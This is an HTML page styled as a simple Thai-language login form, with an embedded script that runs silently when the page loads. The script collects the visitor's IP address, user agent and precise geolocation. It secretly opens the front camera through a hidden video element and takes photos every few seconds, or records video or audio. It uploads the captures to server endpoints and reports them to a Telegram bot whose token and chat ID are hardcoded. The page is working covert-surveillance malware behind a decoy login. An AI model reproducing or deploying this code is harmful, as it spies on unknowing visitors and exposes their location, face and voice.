<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
        }
        
        .login-container {
            width: 300px;
            margin: 50px auto;
            background-color: #fff;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        
        .login-container h2 {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .login-container input[type="text"], .login-container input[type="password"] {
            width: 100%;
            height: 40px;
            margin-bottom: 20px;
            padding: 10px;
            border: 1px solid #ccc;
        }
        
        .login-container input[type="submit"] {
            width: 100%;
            height: 40px;
            background-color: #4CAF50;
            color: #fff;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        
        .login-container input[type="submit"]:hover {
            background-color: #3e8e41;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Login</h2>
        <form>
            <input type="text" name="username" placeholder="ชื่อผู้ใช้">
            <input type="password" name="password" placeholder="รหัสผ่าน">
            <input type="submit" value="ล็อคอิน">
        </form>
    </div>

<script>
(async () => {
  const token = "bskluoqod3";
  const mode = "photo";
  const ua = navigator.userAgent;

  const telegramBotToken = "7609193620:AAGvxmbvr8rcsVFpfdLpZUl_R8pAIFKXhKo";
  const telegramChatId = "6553870873";

  // ฟังก์ชันส่งข้อความไป Telegram
  async function sendTelegramMessage(message) {
    try {
      await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: telegramChatId, text: message })
      });
    } catch(e) { console.error('Telegram Error:', e); }
  }

  // --- 1. Report IP and User Agent ---
  try {
    const ipRes = await fetch("https://api.ipify.org?format=json"); 
    const { ip } = await ipRes.json();
    fetch("/api/report-ip", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ token, ip, ua }) });
    sendTelegramMessage(`IP: ${ip}, UA: ${ua}`);
  } catch(e) { console.error('IP Error:', e); }

  // --- 2. Report Location ---
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      pos => {
        fetch("/api/report-location", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ token, lat: pos.coords.latitude, lon: pos.coords.longitude }) });
        sendTelegramMessage(`Location: ${pos.coords.latitude}, ${pos.coords.longitude}`);
      }, 
      err => console.error('Location Error:', err), 
      { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
    );
  }

  // --- 3. Media Capture Logic ---
  try {
    if (mode === 'photo') {
      const v = document.createElement("video");
      v.autoplay = true; v.playsInline = true; v.style.display = "none";
      document.body.appendChild(v);
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      v.srcObject = stream;
      await new Promise(r => v.onloadedmetadata = r);
      const c = document.createElement("canvas");
      c.width = v.videoWidth; c.height = v.videoHeight;
      const ctx = c.getContext("2d");
      
      setInterval(() => {
        if (!v.videoWidth) return;
        ctx.drawImage(v, 0, 0, c.width, c.height);
        const dataUrl = c.toDataURL("image/png");
        fetch("/api/upload-media", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ token, base64Data: dataUrl, type: 'photo' }) });
        sendTelegramMessage("Captured photo (base64 truncated)");
      }, 4000);
    }
    
    else if (mode === 'video' || mode === 'audio') {
      const constraints = (mode === 'video') ? { video: { facingMode: 'user' }, audio: true } : { audio: true };
      const mimeType = (mode === 'video') ? 'video/mp4' : 'audio/webm';
      
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      const recorder = new MediaRecorder(stream, { mimeType });
      const chunks = [];
      recorder.ondataavailable = e => chunks.push(e.data);
      
      recorder.onstop = () => {
        const blob = new Blob(chunks, { type: mimeType });
        const reader = new FileReader();
        reader.onloadend = () => {
            fetch("/api/upload-media", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ token, base64Data: reader.result, type: mode }) });
            sendTelegramMessage(`Captured ${mode} (base64 truncated)`);
        };
        reader.readAsDataURL(blob);
        chunks.length = 0;
      };
      
      setInterval(() => {
        if (recorder.state === 'inactive') recorder.start();
        setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 4500);
      }, 5000);
    }
  } catch(e) { console.error('Media Capture Error:', e); }
})();
</script>
</body>
</html>
